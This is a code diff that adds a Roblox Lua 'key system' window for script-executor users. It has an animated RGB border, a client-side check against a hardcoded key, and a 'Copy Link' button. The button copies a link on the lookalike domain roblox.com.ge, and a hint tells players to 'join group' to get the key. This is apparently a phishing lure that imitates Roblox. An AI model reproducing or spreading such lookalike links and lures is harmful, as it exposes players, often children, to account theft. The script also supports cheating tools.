@@ -1,0 +1,166 @@
+-- Clean Key System with RGB border glow (works with exploit setclipboard)
+local player = game.Players.LocalPlayer
+local gui = Instance.new("ScreenGui")
+gui.Name = "CleanKeySystem"
+gui.Parent = player:WaitForChild("PlayerGui")
+gui.ResetOnSpawn = false
+
+local correctKey = "MySecretKey123"
+local linkToCopy = "https://roblox.com.ge/communities/9724508409/"
+
+-- Main frame
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 320, 0, 270)
+frame.Position = UDim2.new(0.5, -160, 0.5, -135)
+frame.BackgroundColor3 = Color3.fromRGB(28, 28, 32)
+frame.BorderSizePixel = 0
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 12)
+corner.Parent = frame
+frame.Parent = gui
+
+-- RGB border (UIStroke with changing color)
+local rgbBorder = Instance.new("UIStroke")
+rgbBorder.Thickness = 2
+rgbBorder.Transparency = 0.3
+rgbBorder.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+rgbBorder.Parent = frame
+
+-- Title
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 48)
+title.Position = UDim2.new(0, 0, 0, 0)
+title.BackgroundColor3 = Color3.fromRGB(35, 35, 40)
+title.BackgroundTransparency = 0.5
+title.Text = "KEY SYSTEM"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.Font = Enum.Font.GothamBold
+title.TextSize = 20
+title.TextXAlignment = Enum.TextXAlignment.Center
+title.TextYAlignment = Enum.TextYAlignment.Center
+local titleCorner = Instance.new("UICorner")
+titleCorner.CornerRadius = UDim.new(0, 12)
+titleCorner.Parent = title
+title.Parent = frame
+
+-- Input field
+local keyBox = Instance.new("TextBox")
+keyBox.Size = UDim2.new(0.8, 0, 0, 40)
+keyBox.Position = UDim2.new(0.1, 0, 0.32, 0)
+keyBox.BackgroundColor3 = Color3.fromRGB(45, 45, 50)
+keyBox.BorderSizePixel = 0
+keyBox.PlaceholderText = "Enter key"
+keyBox.Text = ""
+keyBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+keyBox.PlaceholderColor3 = Color3.fromRGB(160, 160, 170)
+keyBox.Font = Enum.Font.SourceSans
+keyBox.TextSize = 16
+local inputCorner = Instance.new("UICorner")
+inputCorner.CornerRadius = UDim.new(0, 8)
+inputCorner.Parent = keyBox
+keyBox.Parent = frame
+
+-- Buttons
+local checkBtn = Instance.new("TextButton")
+checkBtn.Size = UDim2.new(0.35, 0, 0, 40)
+checkBtn.Position = UDim2.new(0.1, 0, 0.55, 0)
+checkBtn.Text = "Check Key"
+checkBtn.BackgroundColor3 = Color3.fromRGB(0, 110, 200)
+checkBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+checkBtn.Font = Enum.Font.GothamBold
+checkBtn.TextSize = 14
+checkBtn.BorderSizePixel = 0
+local checkCorner = Instance.new("UICorner")
+checkCorner.CornerRadius = UDim.new(0, 8)
+checkCorner.Parent = checkBtn
+checkBtn.Parent = frame
+
+local copyBtn = Instance.new("TextButton")
+copyBtn.Size = UDim2.new(0.35, 0, 0, 40)
+copyBtn.Position = UDim2.new(0.55, 0, 0.55, 0)
+copyBtn.Text = "Copy Link"
+copyBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 90)
+copyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+copyBtn.Font = Enum.Font.GothamBold
+copyBtn.TextSize = 14
+copyBtn.BorderSizePixel = 0
+local copyCorner = Instance.new("UICorner")
+copyCorner.CornerRadius = UDim.new(0, 8)
+copyCorner.Parent = copyBtn
+copyBtn.Parent = frame
+
+-- Message label
+local message = Instance.new("TextLabel")
+message.Size = UDim2.new(0.8, 0, 0, 30)
+message.Position = UDim2.new(0.1, 0, 0.72, 0)
+message.BackgroundTransparency = 1
+message.Text = ""
+message.TextColor3 = Color3.fromRGB(200, 200, 200)
+message.Font = Enum.Font.SourceSans
+message.TextSize = 12
+message.TextXAlignment = Enum.TextXAlignment.Center
+message.Parent = frame
+
+-- Hint (bigger)
+local hint = Instance.new("TextLabel")
+hint.Size = UDim2.new(0.9, 0, 0, 30)
+hint.Position = UDim2.new(0.05, 0, 0.86, 0)
+hint.BackgroundTransparency = 1
+hint.Text = "🔑 Join group = key"
+hint.TextColor3 = Color3.fromRGB(200, 200, 210)
+hint.Font = Enum.Font.SourceSansBold
+hint.TextSize = 14
+hint.TextXAlignment = Enum.TextXAlignment.Center
+hint.Parent = frame
+
+-- === RGB COLOR CYCLE ===
+spawn(function()
+    local hue = 0
+    while true do
+        hue = (hue + 0.005) % 1  -- плавное изменение
+        local color = Color3.fromHSV(hue, 1, 1)
+        rgbBorder.Color = color
+        task.wait(0.05)
+    end
+end)
+
+-- === LOGIC ===
+checkBtn.MouseButton1Click:Connect(function()
+    if keyBox.Text == correctKey then
+        message.Text = "✓ Correct key"
+        message.TextColor3 = Color3.fromRGB(100, 255, 100)
+    else
+        message.Text = "✗ Invalid key"
+        message.TextColor3 = Color3.fromRGB(255, 100, 100)
+    end
+    task.wait(2)
+    message.Text = ""
+end)
+
+copyBtn.MouseButton1Click:Connect(function()
+    if setclipboard then
+        setclipboard(linkToCopy)
+        message.Text = "✓ Link copied"
+        message.TextColor3 = Color3.fromRGB(100, 255, 100)
+    else
+        message.Text = "✗ setclipboard not found"
+        message.TextColor3 = Color3.fromRGB(255, 100, 100)
+    end
+    task.wait(2)
+    message.Text = ""
+end)
+
+-- Hover effects
+copyBtn.MouseEnter:Connect(function()
+    copyBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 110)
+end)
+copyBtn.MouseLeave:Connect(function()
+    copyBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 90)
+end)
+
+checkBtn.MouseEnter:Connect(function()
+    checkBtn.BackgroundColor3 = Color3.fromRGB(0, 130, 230)
+end)
+checkBtn.MouseLeave:Connect(function()
+    checkBtn.BackgroundColor3 = Color3.fromRGB(0, 110, 200)
+end)
